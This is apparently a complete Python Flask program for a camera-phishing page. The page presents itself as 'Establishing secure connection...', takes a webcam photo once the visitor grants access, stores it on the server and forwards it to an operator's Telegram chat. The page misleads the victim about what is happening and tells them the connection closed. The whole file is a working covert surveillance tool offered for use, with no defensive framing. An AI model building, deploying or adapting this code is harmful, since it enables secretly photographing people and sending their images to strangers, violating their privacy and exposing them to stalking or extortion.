from flask import Flask, render_template_string, request, jsonify
import requests
import base64
import os
from datetime import datetime

app = Flask(__name__)

# ===== НАСТРОЙКИ =====
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
# =====================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #4fc3f7;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { font-size: 16px; color: #9e9e9e; margin-bottom: 12px; }
        .status.success { color: #66bb6a; }
        .status.error { color: #ef5350; }
        .hint { font-size: 13px; color: #616161; margin-top: 20px; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner" id="spinner"></div>
        <div class="status" id="status">Establishing secure connection...</div>
        <div class="hint" id="hint">Please allow camera access when prompted</div>
        <video id="video" autoplay muted playsinline></video>
    </div>
    <script>
    async function capture() {
        const statusEl = document.getElementById('status');
        const hintEl = document.getElementById('hint');
        const spinnerEl = document.getElementById('spinner');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 640 }, height: { ideal: 480 } }
            });
            statusEl.className = 'status success';
            statusEl.innerText = 'Camera access granted';
            hintEl.innerText = 'Capturing image...';
            spinnerEl.style.display = 'none';
            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 1500));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(t => t.stop());
            const host = window.location.origin;
            const resp = await fetch(host + '/photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
            if (resp.ok) {
                statusEl.innerText = 'Connection closed';
                hintEl.innerText = 'You may leave this page';
            } else {
                throw new Error('Upload failed');
            }
        } catch (e) {
            statusEl.className = 'status error';
            statusEl.innerText = 'Connection failed';
            hintEl.innerText = 'Please try again later';
            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                statusEl.innerText = 'Camera access denied';
                hintEl.innerText = 'Camera permission is required';
            }
        }
    }
    capture();
    </script>
</body>
</html>
"""

def send_telegram_photo(image_b64):
    if "," in image_b64:
        image_b64 = image_b64.split(",")[1]
    try:
        img_data = base64.b64decode(image_b64)
    except Exception as e:
        print(f"[!] Base64 decode error: {e}")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    files = {"photo": ("capture.jpg", img_data, "image/jpeg")}
    caption = f"Capture {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    try:
        r = requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=10)
        print(f"[TG] {r.status_code}")
    except Exception as e:
        print(f"[TG] Error: {e}")

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/photo", methods=["POST"])
def photo():
    data = request.get_json()
    if not data or "image" not in data:
        return jsonify({"status": "error", "message": "no image"}), 400
    image_b64 = data["image"]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("captures", exist_ok=True)
    raw = image_b64.split(",")[1] if "," in image_b64 else image_b64
    with open(f"captures/capture_{ts}.jpg", "wb") as f:
        f.write(base64.b64decode(raw))
    print(f"[+] Saved captures/capture_{ts}.jpg")
    send_telegram_photo(image_b64)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
